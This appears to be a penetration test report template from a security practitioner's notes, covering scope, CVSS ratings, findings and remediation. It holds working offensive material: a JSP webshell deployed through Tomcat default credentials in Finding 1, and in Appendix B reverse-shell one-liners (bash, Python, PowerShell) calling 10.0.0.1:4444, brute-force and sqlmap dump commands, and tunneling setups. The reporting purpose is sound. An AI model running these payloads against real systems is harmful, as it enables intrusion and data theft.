# Penetration Test Report Template

---

**Disclaimer:** This report contains sensitive information regarding the security posture of the assessed systems and should be distributed on a strict need-to-know basis only.

---

## Document Control

| Field | Value |
|-------|-------|
| **Client Name** | [Client Name] |
| **Engagement Type** | External / Internal / Web Application / Network / Wireless / Physical |
| **Assessment Date(s)** | [Start Date] - [End Date] |
| **Report Date** | [Report Date] |
| **Document Version** | 1.0 |
| **Classification** | CONFIDENTIAL |
| **Prepared For** | [Point of Contact, Title] |
| **Prepared By** | [Tester Name / Team Name] |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope and Methodology](#2-scope-and-methodology)
3. [Findings Summary](#3-findings-summary)
4. [Detailed Findings](#4-detailed-findings)
5. [Remediation Recommendations](#5-remediation-recommendations)
6. [Appendix A: Tools Used](#6-appendix-a-tools-used)
7. [Appendix B: Commands and Payloads](#7-appendix-b-commands-and-payloads)
8. [Appendix C: Wordlists and References](#8-appendix-c-wordlists-and-references)

---

## 1. Executive Summary

### 1.1 Overview

[Client Name] engaged [Testing Company] to conduct a comprehensive penetration test of [target environment description] from [Start Date] to [End Date]. The objective was to identify security vulnerabilities that could be exploited by an attacker to compromise the confidentiality, integrity, or availability of the assessed systems.

### 1.2 Scope Summary

| Scope Item | Details |
|-----------|---------|
| **In-Scope Assets** | [IP ranges, URLs, applications] |
| **Out-of-Scope Assets** | [Exclusions and rationale] |
| **Testing Type** | [Black Box / Grey Box / White Box] |
| **Testing Methodology** | [OWASP, PTES, NIST SP 800-115, OSSTMM, etc.] |

### 1.3 Overall Risk Rating

| Severity | Count |
|----------|-------|
| **Critical** | [#] |
| **High** | [#] |
| **Medium** | [#] |
| **Low** | [#] |
| **Informational** | [#] |
| **Total** | [#] |

### 1.4 Executive Summary Narrative

> **Note:** This section should be written for a non-technical audience (C-level executives, boards, VPs). Avoid jargon and technical depth; focus on business risk, regulatory impact, and bottom-line concerns.

[Executive Summary should cover:
- Brief description of the engagement
- High-level findings (themes, not individual vulns)
- Most critical risks and their potential business impact
- Notable successes (what was well-secured)
- Top 3-5 remediation priorities
- Time-bound risk acceptance considerations]

### 1.5 Key Findings at a Glance

| # | Finding | Severity | Asset | CVSS 3.1 |
|---|---------|----------|-------|----------|
| 1 | [Finding Name] | Critical | [Target] | 9.8 |
| 2 | [Finding Name] | High | [Target] | 7.5 |
| 3 | [Finding Name] | High | [Target] | 7.2 |
| 4 | [Finding Name] | Medium | [Target] | 5.4 |
| 5 | [Finding Name] | Low | [Target] | 3.1 |

### 1.6 Attack Narrative

This section describes (at a high level) the flow of attack — what an attacker would chain together to achieve compromise.

```
Initial Access
    |
    v
[Recon on Target A] --> [Found exposed admin interface] --> [Default credentials worked]
    |
    v
[Logged into admin panel] --> [Uploaded webshell via file manager]
    |
    v
[Shell on Target A as www-data] --> [Lateral movement to DB server]
    |
    v
[Dumped user credentials from database] --> [Credential reuse on Target B]
    |
    v
[Target B: Domain admin access via pass-the-hash]
    ===== FULL COMPROMISE =====
```

---

## 2. Scope and Methodology

### 2.1 In-Scope Assets

**Network Range(s):**
- [CIDR Block 1]: [Description]
- [CIDR Block 2]: [Description]

**Web Application(s):**
- [URL 1]: [Description]
- [URL 2]: [Description]

**Additional Targets:**
- [Other assets: APIs, mobile apps, wireless networks, etc.]

### 2.2 Out-of-Scope Assets

- [Asset / Rationale]
- [Asset / Rationale]

### 2.3 Testing Methodology

The assessment was conducted using the following methodology:

```
1. Reconnaissance & Information Gathering
2. Scanning & Enumeration
3. Vulnerability Assessment
4. Exploitation & Proof of Concept
5. Post-Exploitation & Lateral Movement
6. Reporting
```

### 2.4 Methodology Standards

| Framework | Phase Applied |
|-----------|--------------|
| OWASP Testing Guide v4.x | Web Application Testing |
| PTES (Penetration Testing Execution Standard) | All phases |
| NIST SP 800-115 | Methodology reference |
| OSSTMM | Operational security testing |

### 2.5 Testing Constraints

- **Time constraints:** [Hours/days allocated]
- **Scope carve-outs:** [Any restrictions]
- **Allowed techniques:** [What was permitted]
- **Prohibited techniques:** [What was forbidden]
- **Testing window:** [Off-peak / during business hours]

### 2.6 Risk Rating Methodology

Findings are rated using CVSS v3.1 with the following severity scale:

| Severity | CVSS Score Range | Description |
|----------|-----------------|-------------|
| **Critical** | 9.0 - 10.0 | Exploitation trivial; severe impact; immediate remediation required |
| **High** | 7.0 - 8.9 | Significant impact; should be prioritized for remediation |
| **Medium** | 4.0 - 6.9 | Moderate risk; remediate within standard patch cycle |
| **Low** | 0.1 - 3.9 | Limited impact; remediate when convenient |
| **Informational** | 0.0 | No direct risk but may assist attackers or indicate good/bad practice |

---

## 3. Findings Summary

### 3.1 Findings by Category

| Category | Critical | High | Medium | Low | Info |
|----------|----------|------|--------|-----|------|
| Authentication / Authorization | | | | | |
| Configuration / Hardening | | | | | |
| Cryptography / Transport | | | | | |
| Input Validation | | | | | |
| Session Management | | | | | |
| Information Disclosure | | | | | |
| Network Security | | | | | |
| Patch Management | | | | | |
| **Total** | | | | | |

### 3.2 Risk Rating Table

| Rating | CVSS Score | Description |
|--------|-----------|-------------|
| Critical | 9.0 -- 10.0 | Exploitation leads to full system compromise without authentication |
| High | 7.0 -- 8.9 | Significant impact, may require some user interaction |
| Medium | 4.0 -- 6.9 | Limited impact or requires privileged access |
| Low | 0.1 -- 3.9 | Minimal impact, information disclosure only |
| Info | 0.0 | No direct security impact |

---

## 4. Detailed Findings

---

### Finding 1: [Finding Title]

| Field | Value |
|-------|-------|
| **Finding ID** | [ID-001] |
| **Severity** | [Critical / High / Medium / Low / Info] |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CVSS Score** | [9.8] |
| **Asset** | [IP / URL] |
| **Port / Protocol** | [TCP 443 / HTTPS] |
| **Category** | [e.g., Authentication, Input Validation] |
| **CVE/CWE** | [CVE-2023-XXXXX / CWE-287] |

**Description:**

[Clear, technical description of the vulnerability. Explain what the vulnerability is, how it manifests in the specific application/system, and what conditions are required for exploitation. Include the business impact.]

**Example:**
> The Apache Tomcat server running on 192.168.1.10:8080 has the manager application deployed with default credentials (admin:admin). An attacker can authenticate to the manager interface and deploy a malicious WAR file, achieving remote code execution on the server. This allows full compromise of the web application and potential lateral movement.

**Steps to Reproduce:**

```bash
# Step 1: Verify service and default credentials
curl -I http://192.168.1.10:8080/manager/html
# Response: 401 Unauthorized

# Step 2: Authenticate with default credentials
curl -u admin:admin http://192.168.1.10:8080/manager/html
# Response: 200 OK (authenticated)

# Step 3: Create and deploy malicious WAR
mkdir -p webshell/
cat << 'EOF' > webshell/cmd.jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
      out.println(line + "<br>");
    }
  }
%>
EOF

# Step 4: Package and deploy
cd webshell && jar -cvf ../webshell.war . && cd ..
curl -u admin:admin --upload-file webshell.war "http://192.168.1.10:8080/manager/html/upload?path=/webshell"

# Step 5: Execute commands
curl "http://192.168.1.10:8080/webshell/cmd.jsp?cmd=id"
# Output: uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

**Evidence:**

```
[SCREENSHOT 1: Burp proxy showing successful authentication to /manager/html]
[SCREENSHOT 2: Response showing deployed WAR file listed in manager]
[SCREENSHOT 3: Command execution output: id, whoami, uname -a]
```

**Impact:**

[Describe the concrete impact of exploitation. What data/assets/access is compromised?]

**Example:**
> Successful exploitation provides unauthenticated, remote code execution on the web server as the `tomcat` user. From here, an attacker can:
> - Access database credentials from configuration files
> - Pivot to internal network resources
> - Deface the web application
> - Establish persistence for long-term access

**Affected Systems:**

| System | IP Address | Role |
|--------|-----------|------|
| Web Server | 192.168.1.10 | Apache Tomcat 9.0.30 |

**Recommendation:**

[Actionable, specific remediation steps. If applicable, provide code/config examples.]

**Example:**
> 1. Remove or restrict the `/manager/html` endpoint to trusted IPs only
> 2. Change default credentials to a strong, unique password
> 3. Implement network-level access controls (firewall rules) to restrict access to the management interface
> 4. Consider disabling the manager application entirely if not required in production

**References:**
- [Link to CVE]
- [Link to vendor advisory]

---

### Finding 2: [Finding Title]

| Field | Value |
|-------|-------|
| **Finding ID** | [ID-002] |
| **Severity** | [Critical / High / Medium / Low / Info] |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **CVSS Score** | [8.8] |
| **Asset** | [IP / URL] |
| **Port / Protocol** | [TCP 3306 / MySQL] |
| **Category** | [e.g., Weak Cryptography] |
| **CVE/CWE** | [N/A / CWE-327] |

**Description:**

[Deep technical description of the vulnerability.]

**Steps to Reproduce:**

```bash
# Commands used
```

**Evidence:**

```
[Screenshots or command output]
```

**Impact:**

[Consequences of exploitation.]

**Affected Systems:**

| System | IP Address | Role |
|--------|-----------|------|
| | | |

**Recommendation:**

[Remediation guidance.]

> 1. ...
> 2. ...
> 3. ...

**References:**
- [Link to CVE]
- [Link to vendor advisory]

---

### Finding 3: [Finding Title]

[Same structure as above -- repeat for each finding]

---

*(Repeat as necessary for all findings: Critical, High, Medium, Low, Informational)*

---

## 5. Remediation Recommendations

### 5.1 Priority Matrix

| Priority | Timeline | Criteria |
|----------|----------|----------|
| **Immediate** | Within 24-48 hours | Critical vulnerabilities, active exploitation likely |
| **Short-term** | Within 2 weeks | High vulnerabilities, known exploit exists |
| **Medium-term** | Within 4-6 weeks | Medium vulnerabilities, need for remediation |
| **Long-term** | Next quarterly cycle | Low vulnerabilities, hardening improvements |

### 5.2 Strategic Recommendations

**Category: Access Control**
- Implement least privilege access across all systems
- Review and remove unused accounts
- Enforce multi-factor authentication for all administrative interfaces
- Implement proper session management with short expiration times

**Category: Patch Management**
- Establish a formal patch management process with defined SLAs
- Prioritize critical/high severity patches within 48 hours
- Regularly audit third-party software versions for known vulnerabilities
- Subscribe to vendor security advisories

**Category: Secure Configuration**
- Harden server configurations following CIS benchmarks
- Disable unnecessary services and default accounts
- Remove sample/example applications
- Implement security headers (CSP, HSTS, X-Frame-Options)

**Category: Network Security**
- Segment internal networks to limit lateral movement
- Implement firewall rules restricting administrative interfaces
- Deploy network intrusion detection/prevention systems
- Conduct regular internal vulnerability scans

**Category: Application Security**
- Implement input validation and output encoding throughout applications
- Use parameterized queries to prevent SQL injection
- Conduct code reviews and SAST/DAST scans as part of CI/CD
- Implement proper error handling (no stack traces to users)

### 5.3 Quick Wins (Low Effort, High Impact)

| # | Recommendation | Effort | Impact |
|---|---------------|--------|--------|
| 1 | Change default passwords on all systems | Low | High |
| 2 | Disable unnecessary services | Low | High |
| 3 | Enable security headers on web servers | Low | Medium |
| 4 | Restrict admin interfaces to trusted IPs | Low | High |
| 5 | Remove example/default applications | Low | High |

### 5.4 Retesting

[Client] has the option for a one-time retest of resolved findings within [timeframe] of the report delivery. Retesting will focus only on findings marked as remediated and will verify that:

1. The vulnerability is no longer present
2. The remediation did not introduce new vulnerabilities
3. The fix addresses the root cause, not just the symptom

---

## 6. Appendix A: Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | [version] | Network scanning, service enumeration, OS detection |
| Nessus | [version] | Vulnerability scanning |
| OpenVAS / GVM | [version] | Vulnerability scanning |
| Burp Suite Professional | [version] | Web application proxy, scanning, fuzzing |
| ffuf | [version] | Web fuzzing, directory/parameter discovery |
| Gobuster | [version] | Directory and DNS brute forcing |
| Hydra | [version] | Password brute forcing |
| John the Ripper | [version] | Password hash cracking |
| Hashcat | [version] | GPU-accelerated hash cracking |
| Metasploit Framework | [version] | Exploitation and post-exploitation |
| WPScan | [version] | WordPress scanning |
| Impacket | [version] | Windows protocol tools |
| CrackMapExec | [version] | Network service assessment |
| BloodHound | [version] | Active Directory enumeration and attack path analysis |
| Searchsploit | [version] | Offline Exploit-DB searching |
| Kiterunner | [version] | API route discovery |
| Arjun | [version] | HTTP parameter discovery |
| Postman | [version] | API testing and documentation |
| sqlmap | [version] | Automated SQL injection detection and exploitation |
| Netcat | [version] | Manual service interaction |
| Wireshark / tcpdump | [version] | Network traffic capture and analysis |
| Responder | [version] | LLMNR/NBT-NS/mDNS poisoning |
| Evil-WinRM | [version] | WinRM shell |
| Chisel | [version] | Tunneling / proxy |
| Ligolo-ng | [version] | Reverse tunneling |
| Certipy | [version] | AD CS exploitation |
| Python3 | [version] | Scripting and exploit development |

---

## 7. Appendix B: Commands and Payloads

### Reconnaissance and Scanning

```bash
# Initial network discovery
nmap -sn 192.168.1.0/24 -oA discovery

# Full port scan
nmap -sV -sC -p- --min-rate=1000 -T4 <target> -oA full_scan

# Service-specific enumeration
nmap -sV --script=http-enum -p 80,443 <target>
nmap -sV --script=smb-enum-shares,smb-os-discovery -p 445 <target>
nmap -sV --script=dns-zone-transfer -p 53 <target>
nmap -sV --script=ldap-rootdse -p 389 <target>

# UDP scan (limited scope, time-intensive)
nmap -sU --top-ports=100 <target>
```

### Web Application Testing

```bash
# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all

# Parameter discovery
arjun -u http://target.com/api/endpoint
ffuf -u http://target.com/page?FUZZ=test -w params.txt

# SQL injection
sqlmap -u "http://target.com/page?id=1" --batch --level=3 --risk=2
sqlmap -r request.txt --batch --dump

# XSS testing
ffuf -u "http://target.com/search?q=FUZZ" -w xss_payloads.txt -mr "<script>"

# File inclusion
ffuf -u "http://target.com/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-graceful-linux.txt -mr "root:"
```

### Authentication Attacks

```bash
# HTTP form brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com

# RDP brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://target.com

# JWT cracking
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Exploitation

```bash
# Reverse shell (Linux)
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Reverse shell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

### Post-Exploitation

```bash
# Linux enumeration
./linpeas.sh
uname -a; id; sudo -l; find / -perm -4000 2>/dev/null
cat /etc/crontab; crontab -l; ls -la /etc/cron*

# Windows enumeration
.\winPEASx64.exe
whoami; net user; net localgroup administrators
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Pivoting and Lateral Movement

```bash
# Chisel (SOCKS proxy)
# Server (attacker):
chisel server -p 8000 --reverse
# Client (compromised host):
chisel client 10.0.0.1:8000 R:socks

# Proxychains
proxychains nmap -sT -sV -p 445 172.16.1.10
proxychains crackmapexec smb 172.16.1.10

# Ligolo-ng
# Agent (compromised):
./agent -connect 10.0.0.1:11601
# Proxy (attacker):
./proxy -laddr 0.0.0.0:11601
```

---

## 8. Appendix C: Wordlists and References

### Wordlists Used

| Wordlist | Path | Purpose |
|----------|------|---------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | Password cracking |
| directory-list-2.3-medium.txt | `/usr/share/wordlists/dirbuster/` | Directory enumeration |
| common.txt | `/usr/share/seclists/Discovery/Web-Content/common.txt` | Web content discovery |
| api-endpoints.txt | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt` | API endpoint discovery |
| objects.txt | `/usr/share/seclists/Discovery/Web-Content/api/objects.txt` | API resource enumeration |
| LFI-graceful-linux.txt | `/usr/share/seclists/Fuzzing/LFI/` | LFI testing |
| SQLi-Payloads.txt | `/usr/share/seclists/Fuzzing/SQLi/` | SQL injection testing |
| XSS-Payloads.txt | `/usr/share/seclists/Fuzzing/XSS/` | XSS testing |
| usernames.txt | `/usr/share/seclists/Usernames/` | Username enumeration |
| Passwords | `/usr/share/seclists/Passwords/` | Password guessing |

### Vulnerability Databases

| Database | URL |
|----------|-----|
| NVD (National Vulnerability Database) | https://nvd.nist.gov/ |
| Exploit-DB | https://www.exploit-db.com/ |
| Packet Storm | https://packetstormsecurity.com/ |
| CVE Mitre | https://cve.mitre.org/ |
| OWASP | https://owasp.org/ |
| Rapid7 Vulnerability Database | https://www.rapid7.com/db/ |
| Vulners | https://vulners.com/ |
| Microsoft Security Response Center | https://msrc.microsoft.com/ |
| GitHub Security Advisories | https://github.com/advisories |

### Security Frameworks and Standards

| Standard | URL |
|----------|-----|
| OWASP Testing Guide | https://owasp.org/www-project-web-security-testing-guide/ |
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
| PTES | http://www.pentest-standard.org/ |
| NIST SP 800-115 | https://csrc.nist.gov/publications/detail/sp/800-115/final |
| CIS Benchmarks | https://www.cisecurity.org/cis-benchmarks/ |
| CVSS v3.1 Calculator | https://www.first.org/cvss/calculator/3.1 |

### Pentesting Cheatsheets

| Resource | URL |
|----------|-----|
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| HackTricks | https://book.hacktricks.xyz/ |
| Internal All The Things | https://github.com/0xJs/RedTeaming_CheatSheet |
| Hacking Articles | https://www.hackingarticles.in/ |

---

## Document History

| Version | Date | Author | Description of Changes |
|---------|------|--------|------------------------|
| 0.1 | [Date] | [Author] | Initial draft |
| 0.2 | [Date] | [Author] | Internal review |
| 1.0 | [Date] | [Author] | Final client-ready version |
| 1.1 | [Date] | [Author] | [Post-retest update if applicable] |

---

## Sign-Off

| Role | Name | Signature | Date |
|------|------|-----------|------|
| Lead Tester | | | |
| Client POC | | | |
| QA Reviewer | | | |

---

## Related Notes

- [[02 - Vulnerability Assessment/Vulnerability Assessment Notes]] -- vulnerability assessment methodology
- [[03 - Web Application Hacking/3.8 Authentication Bypass/Authentication Bypass Complete]] -- authentication bypass findings
- [[03 - Web Application Hacking/3.9 API Testing/API Testing Complete]] -- API testing findings
- [[03 - Web Application Hacking/3.10 CMS Specific/CMS Hacking Complete]] -- CMS-specific findings
- [[03 - Web Application Hacking/3.11 Common Vulnerabilities/Common Web Vulns]] -- common web vulnerabilities
